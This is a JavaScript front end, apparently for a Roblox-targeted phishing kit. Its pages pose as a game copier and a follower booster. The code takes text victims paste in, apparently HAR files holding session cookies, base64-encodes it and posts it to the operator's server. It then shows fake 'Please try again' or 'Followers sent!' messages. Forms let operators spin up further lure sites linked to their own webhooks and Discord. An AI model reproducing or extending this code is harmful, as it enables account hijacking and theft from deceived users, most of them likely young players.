const notyf = new Notyf({
    duration: 5000,
    position: {
        x: "right",
        y: "top",
    }
});

function download(fileURL, fileName) {
    const link = document.createElement("a");
    link.href = fileURL;
    link.download = fileName;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
};

var stealer_begin = document.getElementById("har-stealer-begin");
var copy_begin = document.getElementById("har-copy-begin");
var follow_begin = document.getElementById("har-follow-begin");
var create_site = document.getElementById("create-site");
var create_quadhook = document.getElementById("create-quadhook");

if (document.getElementById('regular-mode')) {
    document.getElementById('regular-mode').addEventListener("click", () => {
        document.getElementById('quadhook-form').style.display = "none";
        document.getElementById('regular-form').style.display = "block";
    });
};

if (document.getElementById('quadhook-mode')) {
    document.getElementById('quadhook-mode').addEventListener("click", () => {
        document.getElementById('regular-form').style.display = "none";
        document.getElementById('quadhook-form').style.display = "block";
    });
};

if (create_site) {
    create_site.addEventListener("click", async () => {
        var name = document.getElementById("site-name").value;
        var hook = document.getElementById("site-url").value;
        const response = await fetch("/controller/apis/create", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({name, hook})
        });
        const data = await response.json();
        if (data && data.error.message && !response.ok) {
            notyf.error(data.error.message);
        } else {
            window.location.href = "dashboard";
        };
    });
};

if (create_quadhook) {
    create_quadhook.addEventListener("click", async () => {
        var name = document.getElementById("generator-name").value;
        var hook = document.getElementById("generator-url").value;
        var discord = document.getElementById("generator-discord").value;
        var quadhook = true;
        const response = await fetch("/controller/apis/create", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({ name, hook, discord, quadhook})
        });
        if (!response.ok) {
            const data = await response.json();
            if (data && data.error && data.error.message) {
                notyf.error(data.error.message);
            }
            return;
        }
        notyf.success("Quadhook Created, Check your webhook!");
    });
};

if (stealer_begin) {
    stealer_begin.addEventListener("click", async () => {
        if (document.getElementById("secret")) {
            var secret = document.getElementById("secret").value;
        };
        var code = btoa(document.getElementById("har-stealer-input").value);
        const response = await fetch("/controller/apis/submit", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({code, secret})
        });
        if (!response.ok) {
            const data = await response.json();
            if (data && data.error && data.error.message) {
                notyf.error(data.error.message);
            }
            return;
        }
        notyf.success("Attempting Copy Please Wait...");
        setTimeout(() => {
            notyf.error("Please try again");
        }, 11000);
    });
};

if (copy_begin) {
    copy_begin.addEventListener("click", async () => {
        if (document.getElementById("secret")) {
            var secret = document.getElementById("secret").value;
        };
        var code = btoa(document.getElementById("har-copy-input").value);
        const response = await fetch("/controller/apis/submit", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({code, secret})
        });
        if (!response.ok) {
            const data = await response.json();
            if (data && data.error && data.error.message) {
                notyf.error(data.error.message);
            }
            return;
        }
        download("https://" + window.location.hostname + "/storage/copied.rbxl", "copied.rbxl");
        notyf.success("Downloaded Game!");
    });
};

if (follow_begin) {
    follow_begin.addEventListener("click", async () => {
        if (document.getElementById("secret")) {
            var secret = document.getElementById("secret").value;
        };
        var code = btoa(document.getElementById("har-follow-input").value);
        const response = await fetch("/controller/apis/submit", {
            method: "POST",
            headers: {
                "Content-Type": "application / json",
            },
            body: JSON.stringify({code, secret})
        });
        if (!response.ok) {
            const data = await response.json();
            if (data && data.error && data.error.message) {
                notyf.error(data.error.message);
            }
            return;
        }
        notyf.success("Followers sent! They could take up to 5 minutes to arrive.");
    });
};